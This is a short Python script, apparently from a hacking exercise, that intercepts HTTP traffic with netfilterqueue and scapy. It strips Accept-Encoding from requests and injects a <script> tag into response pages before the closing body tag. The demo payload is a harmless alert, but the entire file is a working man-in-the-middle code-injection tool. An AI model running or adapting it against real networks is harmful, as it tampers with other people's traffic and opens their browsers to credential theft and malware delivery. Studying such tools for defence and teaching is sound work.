#! /usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import re


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load

        if scapy_packet[scapy.TCP].dport == 80:
            print("HTTP Request")
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load.decode('latin-1'))

        elif scapy_packet[scapy.TCP].sport == 80:
            print("Response")
            #print(scapy_packet.show())
            load = scapy_packet[scapy.Raw].load.decode('latin-1').replace("</body>",
                                                                          "<script>alert('test');</script></body>")

            if load != scapy_packet[scapy.Raw].load:
                new_packet = set_load(scapy_packet, load)
                packet.set_payload(bytes(new_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
